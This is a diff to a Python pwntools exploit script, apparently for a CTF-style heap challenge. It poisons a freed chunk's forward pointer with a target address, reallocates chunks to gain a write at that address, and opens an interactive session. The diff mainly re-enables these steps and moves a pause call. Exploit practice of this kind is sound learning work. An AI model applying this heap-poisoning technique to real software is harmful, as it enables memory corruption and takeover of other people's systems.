@@ -79,27 +79,22 @@ p.sendline(b'2')
 # payload
 payload = p64(target)
 p.recvline()
-pause()
 p.sendline(payload)
 
-# menu
-p.recvline()
-p.interactive()
-'''
-# allocate 3rd chunk (Grabs 2nd freed chunk LIFO, moves target to 1st chunk)
+# allocate 3rd chunk (Grabs 2nd freed chunk LIFO, moves target into 1st chunk)
 p.recvline()
 p.sendline(b'1')
 p.recvline()
 p.sendline(b'3')
 
-
-# allocate 4th chunk (Grabs 1st freed chunk that includes target)
+# allocate 4th chunk (Grabs 1st freed chunk that includes target in fd)
 p.recvline()
 p.sendline(b'1')
 p.recvline()
 p.sendline(b'4')
 
 # Edit 4th allocated chunk. (Write target address in 1st chunk to an address)
+pause()
 p.recvline()
 p.sendline(b'2')
 p.recvline()
@@ -114,5 +109,4 @@ p.sendline(payload)
 # menu
 p.recvline()
 p.interactive()
-'''
 
